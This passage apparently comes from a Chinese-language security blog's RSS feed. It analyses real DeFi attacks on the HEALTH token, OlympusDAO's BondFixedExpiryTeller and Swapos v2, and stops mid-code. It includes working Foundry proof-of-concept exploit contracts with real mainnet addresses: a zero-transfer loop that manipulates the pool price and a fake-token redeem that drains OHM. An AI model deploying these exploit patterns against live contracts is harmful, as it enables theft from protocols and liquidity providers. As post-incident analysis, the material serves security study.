}&#xA;        }&#xA;        uint256 devValue = value.mul(devFee).div(1000);&#xA;        uint256 bValue = value.mul(bFee).div(1000);&#xA;        uint256 newValue = value.sub(devValue).sub(bValue);&#xA;        _balances[from] = _balances[from].sub(value);&#xA;        _balances[to] = _balances[to].add(newValue);&#xA;        _balances[address(this)] = _balances[address(this)].add(devValue);&#xA;        _balances[_burnAddress] = _balances[_burnAddress].add(bValue);&#xA;        &#xA;        emit Transfer(from,to, newValue);&#xA;        emit Transfer(from,address(this), devValue);&#xA;        emit Transfer(from,_burnAddress, bValue);&#xA;    }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中有一段逻辑是: 每进行一笔转账,就会销毁掉一部分token, 也就是将uniswapV2Pair的余额减去一部分,将_burnAddress的余额增加一部分.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;            if (from != uniswapV2Pair) {&#xA;                uint256 burnValue = _balances[uniswapV2Pair].mul(burnFee).div(1000);&#xA;                _balances[uniswapV2Pair] = _balances[uniswapV2Pair].sub(burnValue);&#xA;                _balances[_burnAddress] = _balances[_burnAddress].add(burnValue);&#xA;                if (block.timestamp &amp;gt;= pairStartTime.add(jgTime)) {&#xA;                    pairStartTime &amp;#43;= jgTime;&#xA;                }&#xA;                emit Transfer(uniswapV2Pair,_burnAddress, burnValue);&#xA;                IPancakePair(uniswapV2Pair).sync();&#xA;            }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但是销毁的量并没有依据transfer时的value进行计算, 而是根据&lt;code&gt;_balances[uniswapV2Pair].mul(burnFee).div(1000)&lt;/code&gt;进行计算的, 假如&lt;code&gt;burnFee&lt;/code&gt;是&lt;code&gt;1&lt;/code&gt;, 那么任意数量的转账都会销毁uniswapV2Pair余额的千分之一, 哪怕转账数量是0.&lt;/p&gt;&#xA;&lt;p&gt;这就导致了一个严重的bug: 重复进行&lt;code&gt;value&lt;/code&gt;为0的转账, 用户手中的币并不会减少, 但&lt;code&gt;uniswapV2Pair&lt;/code&gt;的余额却在不断减少, 这就导致了 pair 中 token0 (WBNB) 与 token1(HEALTH token)的比率不断变化, 也就是相比于WBNB, HEALTH token的价格越来越高. 这就形成了价格操纵.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;poc&#34;&gt;&lt;span&gt;POC&lt;/span&gt;&#xA;  &lt;a href=&#34;#poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;// SPDX-License-Identifier: SEE LICENSE IN LICENSE&#xA;pragma solidity ^0.8.10;&#xA;&#xA;import &amp;#34;forge-std/Test.sol&amp;#34;;&#xA;&#xA;interface IERC20 {&#xA;    function decimals() external view returns (uint8);&#xA;&#xA;    function symbol() external view returns (string memory);&#xA;&#xA;    function balanceOf(address owner) external view returns (uint256);&#xA;&#xA;    function transfer(address to, uint256 value) external returns (bool);&#xA;}&#xA;&#xA;interface IPancakePair {&#xA;    function token0() external view returns (address);&#xA;&#xA;    function token1() external view returns (address);&#xA;&#xA;    function getReserves()&#xA;        external&#xA;        view&#xA;        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);&#xA;}&#xA;&#xA;IERC20 constant HealthToken = IERC20(&#xA;    0x32B166e082993Af6598a89397E82e123ca44e74E&#xA;);&#xA;&#xA;IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);&#xA;&#xA;IPancakePair constant pancakePair = IPancakePair(&#xA;    0xF375709DbdE84D800642168c2e8bA751368e8D32&#xA;);&#xA;&#xA;contract Hack is Test {&#xA;    function setUp() public {&#xA;        vm.createSelectFork(&amp;#34;theNet&amp;#34;, 22337400); //bsc&#xA;    }&#xA;&#xA;    function testPoc() public {&#xA;        console2.log(&amp;#34;token0 is:&amp;#34;, IERC20(pancakePair.token0()).symbol());&#xA;        console2.log(&amp;#34;token1 is:&amp;#34;, IERC20(pancakePair.token1()).symbol());&#xA;&#xA;        (uint112 token0, uint112 token1, ) = pancakePair.getReserves();&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[before]token0&amp;#34;,&#xA;            token0,&#xA;            IERC20(pancakePair.token0()).decimals()&#xA;        );&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[before]token1&amp;#34;,&#xA;            token1,&#xA;            IERC20(pancakePair.token1()).decimals()&#xA;        );&#xA;&#xA;        // 连续0转账500次&#xA;        for (uint i = 0; i &amp;lt; 500; i&amp;#43;&amp;#43;) {&#xA;            HealthToken.transfer(address(this), 0);&#xA;        }&#xA;&#xA;        (token0, token1, ) = pancakePair.getReserves();&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[after]token0 &amp;#34;,&#xA;            token0,&#xA;            IERC20(pancakePair.token0()).decimals()&#xA;        );&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[after]token1 &amp;#34;,&#xA;            token1,&#xA;            IERC20(pancakePair.token1()).decimals()&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[PASS] testPoc() (gas: 11524943)&#xA;Logs:&#xA;  token0 is: HEALTH&#xA;  token1 is: WBNB&#xA;  [before]token0: 62563539.073327292627431307&#xA;  [before]token1: 38.502835300011026965&#xA;  [after]token0 : 37937212.810065723981756912&#xA;  [after]token1 : 38.502835300011026965&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以循环500次为例, pair中的HEALTH token数量减少了接近一半, 也就是价格涨了接近一半.&lt;/p&gt;&#xA;&lt;p&gt;在实际攻击中, 攻击者先利用闪电贷贷款了WBNB, 然后用WBNB swap了一些 HEALTH, 然后操作价格, 再高价将手中的HEALTH通过swap卖出而获利.&lt;/p&gt;</description>
    </item>
    <item>
      <title>BondFixedExpiryTeller 攻击案例分析</title>
      <link>https://yinhui1984.github.io/olympusdao-attack-analysis/</link>
      <pubDate>Thu, 27 Apr 2023 09:04:23 +0800</pubDate>
      <guid>https://yinhui1984.github.io/olympusdao-attack-analysis/</guid>
      <category domain="https://yinhui1984.github.io/categories/security/">Security</category>
      <description>&lt;p&gt;OlympusDao BondFixedExpiryTeller 攻击案例分析&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;漏洞分析&#34;&gt;&lt;span&gt;漏洞分析&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;攻击发生在以太坊链https://etherscan.io/tx/0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf&lt;/p&gt;&#xA;&lt;p&gt;存在漏洞的合约地址为: &lt;a href=&#34;https://etherscan.io/address/0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156#code&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;在其中的&lt;code&gt;BondFixedExpiryTeller.sol&lt;/code&gt;存在&lt;code&gt;redeem&lt;/code&gt;函数, 代码如下:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;    function redeem(ERC20BondToken token_, uint256 amount_) external override nonReentrant {&#xA;        if (uint48(block.timestamp) &amp;lt; token_.expiry())&#xA;            revert Teller_TokenNotMatured(token_.expiry());&#xA;        token_.burn(msg.sender, amount_);&#xA;        token_.underlying().transfer(msg.sender, amount_);&#xA;    }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个函数的含义是&amp;quot;存在tokenA, 将tokenA毁掉一定数量, 并将相同数量的tokenB发送给msg.sender, 其中tokenB由tokenA的underlying()函数来指定&amp;quot;&lt;/p&gt;&#xA;&lt;p&gt;其中 &lt;code&gt;token_.underlying().transfer(msg.sender, amount_);&lt;/code&gt;就是直接调用的tokenX的transfer()函数将其转给msg.sender, 也就是说该合约中如果存在任何IERC20(或类似的有转账函数的币)都可以通过这句代码转给msg.sender.&lt;/p&gt;&#xA;&lt;p&gt;合约中有哪些币呢? 在区块链浏览器上可以看到有很多&lt;a href=&#34;https://etherscan.io/token/0x64aa3364f17a4d01c6f1751fd97c2bd3d7e7f1d5?a=0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;OHM&lt;/a&gt;被转到了该合约, 查看OHM的代码&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;contract OlympusERC20Token is ERC20Permit, IOHM, OlympusAccessControlled {&#xA;}&#xA;&#xA;interface IOHM is IERC20 {&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;poc&#34;&gt;&lt;span&gt;POC&lt;/span&gt;&#xA;  &lt;a href=&#34;#poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;// SPDX-License-Identifier: SEE LICENSE IN LICENSE&#xA;pragma solidity ^0.8.10;&#xA;&#xA;import &amp;#34;forge-std/Test.sol&amp;#34;;&#xA;&#xA;interface IERC20 {&#xA;    function balanceOf(address owner) external view returns (uint256);&#xA;&#xA;    function decimals() external view returns (uint8);&#xA;}&#xA;&#xA;interface IBondFixedExpiryTeller {&#xA;    function redeem(address token_, uint256 amount_) external;&#xA;}&#xA;&#xA;IERC20 constant OHM = IERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);&#xA;&#xA;//buggy:&#xA;IBondFixedExpiryTeller constant BondFixedExpiryTeller = IBondFixedExpiryTeller(&#xA;    0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156&#xA;);&#xA;&#xA;contract FakeToken {&#xA;    function underlying() external pure returns (address) {&#xA;    &#x9;&#x9;//指向 OHM&#xA;    &#x9;&#x9;//这样redeem()函数中的&#xA;    &#x9;&#x9;// token_.underlying().transfer(msg.sender, amount_);&#xA;    &#x9;&#x9;// 就变成了&#xA;    &#x9;&#x9;// OHM.transfer(msg.sender, amount_);&#xA;        return address(OHM);&#xA;    }&#xA;&#xA;    // 绕过require&#xA;    function expiry() external pure returns (uint48 _expiry) {&#xA;        return 1;&#xA;    }&#xA;&#xA;    function burn(address, uint256) external {}&#xA;}&#xA;&#xA;//attack TX: https://etherscan.io/tx/0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf&#xA;contract Hack is Test {&#xA;    function setUp() public {&#xA;        vm.createSelectFork(&amp;#34;theNet&amp;#34;, 15794360); //ETH&#xA;    }&#xA;&#xA;    function testPoc() public {&#xA;        FakeToken ft = new FakeToken();&#xA;        BondFixedExpiryTeller.redeem(address(ft), 1000 * 10 ** OHM.decimals());&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;OHM balance:&amp;#34;,&#xA;            OHM.balanceOf(address(this)),&#xA;            OHM.decimals()&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>Swapos v2 attack 攻击分析</title>
      <link>https://yinhui1984.github.io/analysis_of_swaposv2_attack/</link>
      <pubDate>Wed, 19 Apr 2023 10:12:15 +0800</pubDate>
      <guid>https://yinhui1984.github.io/analysis_of_swaposv2_attack/</guid>
      <category domain="https://yinhui1984.github.io/categories/security/">Security</category>
      <description>&lt;p&gt;saving gas的锅&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://twitter.com/CertiKAlert/status/1647530789947469825&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://twitter.com/CertiKAlert/status/1647530789947469825&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;以攻击者的这个tx为例: &lt;a href=&#34;https://etherscan.io/tx/0xbe643ccdcae57181b9fef554d63029e0605b2e860172d442c37eaabffdb44575&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://etherscan.io/tx/0xbe643ccdcae57181b9fef554d63029e0605b2e860172d442c37eaabffdb44575&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;漏洞分析&#34;&gt;&lt;span&gt;漏洞分析&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;存在漏洞的合约地址为 &lt;a href=&#34;https://etherscan.io/address/0x8ce2f9286f50fbe2464bfd881fab8effc8dc584f#code&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;在其合约代码&lt;a href=&#34;https://vscode.blockscan.com/ethereum/0xf40593A22398c277237266A81212f7D41023b630&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SwaposV2Pair.sol&lt;/a&gt; 中 提供了一个外部函数&lt;code&gt;swap()&lt;/code&gt; , 代码如下:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;    function swap(&#xA;        uint amount0Out,&#xA;        uint amount1Out,&#xA;        address to,&#xA;        bytes calldata data&#xA;    ) external lock {&#xA;        require(&#xA;            amount0Out &amp;gt; 0 || amount1Out &amp;gt; 0,&#xA;            &amp;#34;SwaposV2: INSUFFICIENT_OUTPUT_AMOUNT&amp;#34;&#xA;        );&#xA;        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings &#xA;        require(&#xA;            amount0Out &amp;lt; _reserve0 &amp;amp;&amp;amp; amount1Out &amp;lt; _reserve1,&#xA;            &amp;#34;SwaposV2: INSUFFICIENT_LIQUIDITY&amp;#34;&#xA;        );&#xA;&#xA;        uint balance0;&#xA;        uint balance1;&#xA;        {&#xA;            // scope for _token{0,1}, avoids stack too deep errors&#xA;            address _token0 = token0;&#xA;            address _token1 = token1;&#xA;&#xA;            require(to != _token0 &amp;amp;&amp;amp; to != _token1, &amp;#34;SwaposV2: INVALID_TO&amp;#34;);&#xA;            &#xA;            if (amount0Out &amp;gt; 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens&#xA;            if (amount1Out &amp;gt; 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens&#xA;            &#xA;            if (data.length &amp;gt; 0)&#xA;                ISwaposV2Callee(to).swaposV2Call(&#xA;                    msg.sender,&#xA;                    amount0Out,&#xA;                    amount1Out,&#xA;                    data&#xA;                );&#xA;            &#xA;            balance0 = IERC20(_token0).balanceOf(address(this));&#xA;            balance1 = IERC20(_token1).balanceOf(address(this));&#xA;        }&#xA;       &#xA;        uint amount0In = balance0 &amp;gt; _reserve0 - amount0Out&#xA;            ? balance0 - (_reserve0 - amount0Out)&#xA;            : 0;&#xA;        uint amount1In = balance1 &amp;gt; _reserve1 - amount1Out&#xA;            ? balance1 - (_reserve1 - amount1Out)&#xA;            : 0;&#xA;        require(&#xA;            amount0In &amp;gt; 0 || amount1In &amp;gt; 0,&#xA;            &amp;#34;SwaposV2: INSUFFICIENT_INPUT_AMOUNT&amp;#34;&#xA;        );&#xA;&#xA;        {&#xA;            uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(10));&#xA;            uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(10));&#xA;            require(&#xA;                balance0Adjusted.mul(balance1Adjusted) &amp;gt;=&#xA;                    uint(_reserve0).mul(_reserve1).mul(1000 ** 2),&#xA;                &amp;#34;SwaposV2: K&amp;#34;&#xA;            );&#xA;        }&#xA;&#xA;        _update(balance0, balance1, _reserve0, _reserve1);&#xA;        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);&#xA;    }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意到其中的这两行代码:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;            if (amount0Out &amp;gt; 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens&#xA;            if (amount1Out &amp;gt; 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中&lt;code&gt;_safeTransfer&lt;/code&gt;代码如下:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;    function _safeTransfer(address token, address to, uint value) private {&#xA;        (bool success, bytes memory data) = token.call(&#xA;            abi.encodeWithSelector(SELECTOR, to, value)&#xA;        );&#xA;        require(&#xA;            success &amp;amp;&amp;amp; (data.length == 0 || abi.decode(data, (bool))),&#xA;            &amp;#34;SwaposV2: TRANSFER_FAILED&amp;#34;&#xA;        );&#xA;    }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;也就是说 &lt;code&gt;swap()&lt;/code&gt;函数允许外部调用者将池子的中的token0或token1 发送给任意接收方 😱&lt;/p&gt;&#xA;&lt;p&gt;当然, 代码中有一堆&lt;code&gt;require&lt;/code&gt;语句用于条件检查, 只要能绕过这些检查, 就能任意转账&lt;/p&gt;&#xA;&lt;p&gt;假设攻击者要将池中的大部分token0 划转给自己:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SwaposV2.swap(&amp;lt;90% of token0 in the pool&amp;gt;, 0, &amp;lt;address of attacker&amp;gt;, &amp;#34;&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;那么攻击者我们能不能绕过这些&lt;code&gt;require&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;require-1&#34;&gt;&lt;span&gt;require 1&lt;/span&gt;&#xA;  &lt;a href=&#34;#require-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;        require(&#xA;            amount0Out &amp;gt; 0 || amount1Out &amp;gt; 0,&#xA;            &amp;#34;SwaposV2: INSUFFICIENT_OUTPUT_AMOUNT&amp;#34;&#xA;        );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;检查&lt;code&gt;amount0Out&lt;/code&gt;和&lt;code&gt;amount1Out&lt;/code&gt; 至少一个大于0, 攻击者传入的&lt;code&gt;amount0Out&lt;/code&gt;参数为&amp;quot;90% of token0 in the pool&amp;quot;, 没毛病&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;require-2&#34;&gt;&lt;span&gt;require 2&lt;/span&gt;&#xA;  &lt;a href=&#34;#require-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;&#xA;        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); &#xA;        require(&#xA;            amount0Out &amp;lt; _reserve0 &amp;amp;&amp;amp; amount1Out &amp;lt; _reserve1,&#xA;            &amp;#34;SwaposV2: INSUFFICIENT_LIQUIDITY&amp;#34;&#xA;        );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;获取库存, 检查输出小于库存, 攻击者只要90% 🤪&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;require-3&#34;&gt;&lt;span&gt;require 3&lt;/span&gt;&#xA;  &lt;a href=&#34;#require-3&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;require(to != _token0 &amp;amp;&amp;amp; to != _token1, &amp;#34;SwaposV2: INVALID_TO&amp;#34;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;确保接收方不是token0或token1, 没问题, 是攻击者&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;require-4&#34;&gt;&lt;span&gt;require 4&lt;/span&gt;&#xA;  &lt;a href=&#34;#require-4&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;        &#xA;        balance0 = IERC20(_token0).balanceOf(address(this));&#xA;        balance1 = IERC20(_token1).balanceOf(address(this));&#xA;        uint amount0In = balance0 &amp;gt; _reserve0 - amount0Out&#xA;            ? balance0 - (_reserve0 - amount0Out)&#xA;            : 0;&#xA;        uint amount1In = balance1 &amp;gt; _reserve1 - amount1Out&#xA;            ? balance1 - (_reserve1 - amount1Out)&#xA;            : 0;&#xA;        require(&#xA;            amount0In &amp;gt; 0 || amount1In &amp;gt; 0,&#xA;            &amp;#34;SwaposV2: 